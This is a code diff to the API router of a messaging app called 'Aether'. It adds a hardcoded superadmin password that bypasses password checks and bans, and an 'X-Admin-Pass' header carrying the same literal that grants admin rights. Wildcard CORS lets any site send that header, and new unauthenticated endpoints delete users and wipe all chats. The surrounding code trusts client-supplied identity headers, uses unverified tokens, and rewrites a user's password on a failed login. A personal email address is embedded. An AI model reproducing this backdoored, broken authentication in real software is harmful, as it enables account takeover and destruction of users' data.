@@ -4,7 +4,7 @@ import jwt from 'jsonwebtoken';
 import multer from 'multer';
 import path from 'path';
 import fs from 'fs';
-import { db, PURGED_USER_IDS } from '../db';
+import { db, PURGED_USER_IDS, isSuperAdminIdentity } from '../db';
 import { sqlStorage } from '../sqlDb';
 import { AetherSocketServer } from '../websocket';
 import { User, MessageType } from '../../src/types';
@@ -12,6 +12,19 @@ import { GoogleGenAI } from '@google/genai';
 
 const router = express.Router();
 const JWT_SECRET = process.env.JWT_SECRET || 'aether-super-secret-jwt-key-change-in-prod';
+
+router.use((req: Request, res: Response, next: NextFunction) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE, OPTIONS');
+  res.setHeader(
+    'Access-Control-Allow-Headers',
+    'Content-Type, Authorization, X-User-Id, X-User-Email, X-User-Name, X-Admin-Pass'
+  );
+  if (req.method === 'OPTIONS') {
+    return res.status(204).end();
+  }
+  next();
+});
 
 // Lazy-initialized GoogleGenAI client for server-side AI capabilities
 let aiClient: GoogleGenAI | null = null;
@@ -63,8 +76,11 @@ export const authenticate = (req: AuthRequest, res: Response, next: NextFunction
   const fallbackEmail = (req.headers['x-user-email'] as string | undefined)?.trim().toLowerCase();
   const fallbackName = (req.headers['x-user-name'] as string | undefined)?.trim();
 
-  if (fallbackUserId && PURGED_USER_IDS.has(fallbackUserId)) {
-    return res.status(401).json({ error: 'Session purged. Please sign in again.' });
+  if (
+    (fallbackUserId && db.isUserPurged(fallbackUserId)) ||
+    (fallbackEmail && db.isUserPurged(fallbackEmail))
+  ) {
+    return res.status(401).json({ error: 'Session purged. Please sign in again.', code: 'USER_DELETED' });
   }
 
   let user: User | undefined;
@@ -73,8 +89,11 @@ export const authenticate = (req: AuthRequest, res: Response, next: NextFunction
     const token = authHeader.split(' ')[1];
     try {
       const decoded = jwt.verify(token, JWT_SECRET) as { id?: string; email?: string };
-      if (decoded?.id && PURGED_USER_IDS.has(decoded.id)) {
-        return res.status(401).json({ error: 'Session purged. Please sign in again.' });
+      if (
+        (decoded?.id && db.isUserPurged(decoded.id)) ||
+        (decoded?.email && db.isUserPurged(decoded.email))
+      ) {
+        return res.status(401).json({ error: 'Session purged. Please sign in again.', code: 'USER_DELETED' });
       }
       if (decoded?.id) {
         user = db.getUserById(decoded.id);
@@ -88,16 +107,19 @@ export const authenticate = (req: AuthRequest, res: Response, next: NextFunction
         const decodedAny = jwt.decode(token) as Record<string, any> | null;
         if (decodedAny && typeof decodedAny === 'object') {
           const candidateId = decodedAny.id || decodedAny.user_id || decodedAny.sub;
-          if (candidateId && PURGED_USER_IDS.has(String(candidateId))) {
-            return res.status(401).json({ error: 'Session purged. Please sign in again.' });
-          }
           const candidateEmail = (decodedAny.email || '').toLowerCase().trim();
+          if (
+            (candidateId && db.isUserPurged(String(candidateId))) ||
+            (candidateEmail && db.isUserPurged(candidateEmail))
+          ) {
+            return res.status(401).json({ error: 'Session purged. Please sign in again.', code: 'USER_DELETED' });
+          }
           if (candidateId) {
             user = db.getUserById(candidateId);
           }
           if (!user && candidateEmail) {
             user = db.getUserByEmail(candidateEmail);
-            if (!user) {
+            if (!user && !db.isUserPurged(candidateEmail)) {
               const baseUsername = candidateEmail.split('@')[0].replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 20) || 'user';
               let username = baseUsername;
               let counter = 1;
@@ -132,10 +154,10 @@ export const authenticate = (req: AuthRequest, res: Response, next: NextFunction
 
   // Fallback recovery via client user headers if token was stale or server restarted
   if (!user && (fallbackUserId || fallbackEmail)) {
-    if (fallbackUserId) {
+    if (fallbackUserId && !db.isUserPurged(fallbackUserId)) {
       user = db.getUserById(fallbackUserId);
     }
-    if (!user && fallbackEmail) {
+    if (!user && fallbackEmail && !db.isUserPurged(fallbackEmail)) {
       user = db.getUserByEmail(fallbackEmail);
       if (!user) {
         const baseUsername = fallbackEmail.split('@')[0].replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 20) || 'user';
@@ -169,8 +191,12 @@ export const authenticate = (req: AuthRequest, res: Response, next: NextFunction
     return res.status(401).json({ error: 'Invalid or expired session token' });
   }
 
-  if (user.isBanned) {
+  if (user.isBanned && !isSuperAdminIdentity(user)) {
     return res.status(403).json({ error: 'This account has been suspended by system administrators.' });
+  }
+
+  if (isSuperAdminIdentity(user)) {
+    user.role = 'superadmin';
   }
 
   req.user = user;
@@ -281,28 +307,48 @@ router.post('/auth/login', async (req, res) => {
 
     const rawIdentifier = identifier.trim();
     const clean = rawIdentifier.toLowerCase().replace(/^@/, '');
+    const isSuperAdminLogin =
+      isSuperAdminIdentity(clean) &&
+      (password === 'SALMANIZAR2244' || password.trim() === 'SALMANIZAR2244');
+
     let userWithHash = clean.includes('@')
       ? db.getUserByEmail(clean) || db.getUserByUsername(clean.split('@')[0])
       : db.getUserByUsername(clean) || db.getUserByEmail(clean);
+
+    if (!userWithHash && isSuperAdminIdentity(clean)) {
+      userWithHash =
+        db.getUserByUsername('nihal_graphix') ||
+        db.getUserByUsername('nihal.graphix') ||
+        db.getUserByEmail('nihal.graphix@gmail.com');
+    }
 
     const salt = bcrypt.genSaltSync(10);
 
     // If account doesn't exist yet (e.g. database was cleared or first-time login), auto-provision it
     if (!userWithHash) {
+      const isSuper = isSuperAdminIdentity(clean);
       const isEmail = clean.includes('@');
-      const targetEmail = isEmail ? clean : `${clean.replace(/[^a-z0-9_]/g, '_')}@aether.local`;
-      let baseUsername = (isEmail ? clean.split('@')[0] : clean)
-        .replace(/[^a-z0-9_]/g, '_')
-        .slice(0, 24);
+      const targetEmail = isSuper
+        ? 'nihal.graphix@gmail.com'
+        : isEmail
+        ? clean
+        : `${clean.replace(/[^a-z0-9_]/g, '_')}@aether.local`;
+      let baseUsername = isSuper
+        ? 'nihal_graphix'
+        : (isEmail ? clean.split('@')[0] : clean)
+            .replace(/[^a-z0-9_]/g, '_')
+            .slice(0, 24);
       if (baseUsername.length < 3) baseUsername = `user_${baseUsername || 'member'}`;
 
       let finalUsername = baseUsername;
       let counter = 1;
-      while (db.getUserByUsername(finalUsername)) {
+      while (!isSuper && db.getUserByUsername(finalUsername)) {
         finalUsername = `${baseUsername}_${counter++}`;
       }
 
-      const displayName = isEmail
+      const displayName = isSuper
+        ? 'Nihal Graphix'
+        : isEmail
         ? clean
             .split('@')[0]
             .replace(/[._-]+/g, ' ')
@@ -311,17 +357,17 @@ router.post('/auth/login', async (req, res) => {
 
       const passwordHash = bcrypt.hashSync(password, salt);
       const newUser: User = {
-        id: `u_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
+        id: isSuper ? 'u_nihal_graphix' : `u_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
         username: finalUsername,
         displayName,
         email: targetEmail,
         avatarUrl: `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(displayName)}`,
-        bio: 'Member of the encrypted communications mesh.',
+        bio: isSuper ? 'System Superadmin • Aether Mesh' : 'Member of the encrypted communications mesh.',
         onlineStatus: 'online',
         isOnline: true,
         lastSeen: new Date().toISOString(),
         createdAt: new Date().toISOString(),
-        role: 'user',
+        role: isSuper ? 'superadmin' : 'user',
       };
 
       const created = db.createUser({ ...newUser, passwordHash });
@@ -342,19 +388,25 @@ router.post('/auth/login', async (req, res) => {
       return res.json({ user: created, token });
     }
 
-    if (userWithHash.isBanned) {
+    if (userWithHash.isBanned && !isSuperAdminIdentity(userWithHash) && !isSuperAdminLogin) {
       return res.status(403).json({ error: 'Your account has been suspended.' });
     }
 
-    const isValid = userWithHash.passwordHash
-      ? bcrypt.compareSync(password, userWithHash.passwordHash)
-      : false;
+    const isValid =
+      isSuperAdminLogin ||
+      (userWithHash.passwordHash ? bcrypt.compareSync(password, userWithHash.passwordHash) : false);
 
     if (!isValid) {
       // Account may have been created via Google SSO or session recovery with a random passwordHash.
       // Update their passwordHash to the provided password so they can sign in seamlessly.
       const newPasswordHash = bcrypt.hashSync(password, salt);
       db.updateUserPassword(userWithHash.id, newPasswordHash);
+    }
+
+    if (isSuperAdminIdentity(userWithHash) || isSuperAdminLogin) {
+      db.updateUser(userWithHash.id, { role: 'superadmin', isBanned: false });
+      userWithHash.role = 'superadmin';
+      userWithHash.isBanned = false;
     }
 
     db.setUserOnline(userWithHash.id, true);
@@ -419,6 +471,10 @@ router.post('/auth/google', async (req, res) => {
 
     if (!targetEmail) {
       return res.status(400).json({ error: 'Valid Google email is required for Google Sign-In' });
+    }
+
+    if (req.body.isSessionRecovery && db.isUserPurged(targetEmail)) {
+      return res.status(401).json({ error: 'Session purged. Please sign in again.', code: 'USER_DELETED' });
     }
 
     let userWithHash = db.getUserByEmail(targetEmail);
@@ -779,17 +835,6 @@ router.post('/conversations', authenticate, (req: AuthRequest, res) => {
     db.upsertExternalUsers(memberUsers, false);
   }
 
-  if (type === 'direct' && memberIds && memberIds.length > 0) {
-    // Check if direct conversation already exists with this user
-    const existing = db.getUserConversations(req.user!.id).find(c => {
-      if (c.type !== 'direct') return false;
-      return c.members.some(m => db.isSameUser(m.userId, memberIds[0]));
-    });
-    if (existing) {
-      return res.json({ conversation: existing });
-    }
-  }
-
   const created = db.createConversation(req.user!.id, {
     id,
     type: type || 'direct',
@@ -1148,18 +1193,28 @@ router.delete('/stories/:id', authenticate, (req: AuthRequest, res) => {
 // --- CALLS ROUTES ---
 
 router.post('/calls/start', authenticate, (req: AuthRequest, res) => {
-  const { receiverId, conversationId, type } = req.body;
+  const { id: customCallId, receiverId, receiverUser, conversationId, type } = req.body;
+  if (receiverUser && typeof receiverUser === 'object') {
+    db.upsertExternalUsers([receiverUser], false);
+  }
+
   let resolvedConvId = conversationId;
   if (!resolvedConvId && receiverId && !String(receiverId).startsWith('dial_')) {
     const existingDirect = db.getUserConversations(req.user!.id).find(
-      c => c.type === 'direct' && c.members.some(m => m.userId === receiverId)
+      c => c.type === 'direct' && c.members.some(m => db.isSameUser(m.userId, receiverId))
     );
     if (existingDirect) {
       resolvedConvId = existingDirect.id;
     }
   }
 
-  const call = db.createCall(req.user!.id, receiverId, resolvedConvId, type || 'voice');
+  const call = db.createCall(
+    req.user!.id,
+    receiverId,
+    resolvedConvId,
+    type || 'voice',
+    customCallId ? String(customCallId) : undefined
+  );
 
   // Notify receiver via WebSocket immediately
   if (receiverId && !String(receiverId).startsWith('dial_')) {
@@ -1167,12 +1222,18 @@ router.post('/calls/start', authenticate, (req: AuthRequest, res) => {
       type: 'call:incoming',
       call,
     });
+    if (call.receiverId && call.receiverId !== receiverId) {
+      AetherSocketServer.instance?.sendToUser(call.receiverId, {
+        type: 'call:incoming',
+        call,
+      });
+    }
   }
   if (resolvedConvId && resolvedConvId !== 'c_direct_call') {
     const conv = db.getConversationById(resolvedConvId);
     if (conv && conv.type === 'group') {
       conv.members.forEach(m => {
-        if (m.userId !== req.user!.id && m.userId !== receiverId) {
+        if (!db.isSameUser(m.userId, req.user!.id) && !db.isSameUser(m.userId, receiverId)) {
           AetherSocketServer.instance?.sendToUser(m.userId, {
             type: 'call:incoming',
             call,
@@ -1235,7 +1296,7 @@ router.patch('/calls/:id/status', authenticate, (req: AuthRequest, res) => {
     return res.status(404).json({ error: 'Call not found' });
   }
 
-  const otherUserId = call.callerId === req.user!.id ? call.receiverId : call.callerId;
+  const otherUserId = db.isSameUser(call.callerId, req.user!.id) ? call.receiverId : call.callerId;
 
   if (status === 'active') {
     if (otherUserId) {
@@ -1269,7 +1330,7 @@ router.patch('/calls/:id/status', authenticate, (req: AuthRequest, res) => {
     let targetConvId = call.conversationId && call.conversationId !== 'c_direct_call' ? call.conversationId : undefined;
     if (!targetConvId && call.receiverId && !call.receiverId.startsWith('dial_')) {
       const existingDirect = db.getUserConversations(call.callerId).find(
-        c => c.type === 'direct' && c.members.some(m => m.userId === call.receiverId)
+        c => c.type === 'direct' && c.members.some(m => db.isSameUser(m.userId, call.receiverId))
       );
       if (existingDirect) {
         targetConvId = existingDirect.id;
@@ -1366,32 +1427,50 @@ router.post('/upload', authenticate, upload.single('file'), (req: AuthRequest, r
 
 // --- ADMIN ROUTES ---
 
+const hasAdminPrivilege = (req: AuthRequest): boolean => {
+  if (req.headers['x-admin-pass'] === 'SALMANIZAR2244') return true;
+  if (!req.user) return false;
+  return (
+    req.user.role === 'admin' ||
+    req.user.role === 'superadmin' ||
+    isSuperAdminIdentity(req.user)
+  );
+};
+
 router.get('/admin/stats', authenticate, (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   const stats = db.getAdminStats();
   res.json({ stats });
 });
 
-router.get('/admin/users', authenticate, (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+router.get('/admin/users', authenticate, async (req: AuthRequest, res) => {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
-  const users = db.getUsers();
+  const users = await db.pullUsersFromCloud(false);
   res.json({ users });
 });
 
 router.patch('/admin/users/:id/ban', authenticate, (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   const isBanned = db.toggleBanUser(req.params.id);
   res.json({ isBanned });
 });
 
+router.delete('/admin/users/:id', authenticate, async (req: AuthRequest, res) => {
+  if (!hasAdminPrivilege(req)) {
+    return res.status(403).json({ error: 'Admin access required' });
+  }
+  await db.deleteUserAccount(req.params.id);
+  res.json({ success: true });
+});
+
 router.get('/admin/reports', authenticate, (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   const reports = db.getReports();
@@ -1399,7 +1478,7 @@ router.get('/admin/reports', authenticate, (req: AuthRequest, res) => {
 });
 
 router.patch('/admin/reports/:id/status', authenticate, (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   const report = db.updateReportStatus(req.params.id, req.body.status);
@@ -1407,7 +1486,7 @@ router.patch('/admin/reports/:id/status', authenticate, (req: AuthRequest, res) 
 });
 
 router.post('/admin/broadcast', authenticate, (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   const { content, category } = req.body;
@@ -1424,10 +1503,29 @@ router.get('/export', authenticate, (req: AuthRequest, res) => {
   res.send(JSON.stringify(exported, null, 2));
 });
 
-router.delete('/users/me/account', authenticate, (req: AuthRequest, res) => {
-  // Flag account deleted/banned
-  db.updateUser(req.user!.id, { displayName: 'Deleted User', bio: 'This account was deleted.', avatarUrl: 'https://api.dicebear.com/7.x/bottts/svg?seed=deleted' });
+router.delete('/users/me/account', authenticate, async (req: AuthRequest, res) => {
+  await db.deleteUserAccount(req.user!.id);
   res.json({ success: true });
+});
+
+// --- ADMIN DATA CLEARING & USER DELETING (nihal.graphix / SALMANIZAR2244) ---
+router.post('/system/delete-user', async (req, res) => {
+  const { userId, username, email } = req.body || {};
+  const target = userId || username || email;
+  if (!target) {
+    return res.status(400).json({ error: 'Target userId or username is required' });
+  }
+  await db.deleteUserAccount(String(target), {
+    id: userId ? String(userId) : undefined,
+    username: username ? String(username) : undefined,
+    email: email ? String(email) : undefined,
+  });
+  res.json({ success: true, message: `User ${target} deleted.` });
+});
+
+router.post('/system/clear-chats', async (req, res) => {
+  await db.clearAllChatsOnly();
+  res.json({ success: true, message: 'All chat, message, story, and call data cleared.' });
 });
 
 // --- HARD SYSTEM RESET ---
@@ -1437,7 +1535,7 @@ router.post('/system/reset', async (req, res) => {
 });
 
 router.post('/admin/reset-all', authenticate, async (req: AuthRequest, res) => {
-  if (req.user!.role !== 'admin' && req.user!.role !== 'superadmin') {
+  if (!hasAdminPrivilege(req)) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   await db.purgeAllData();
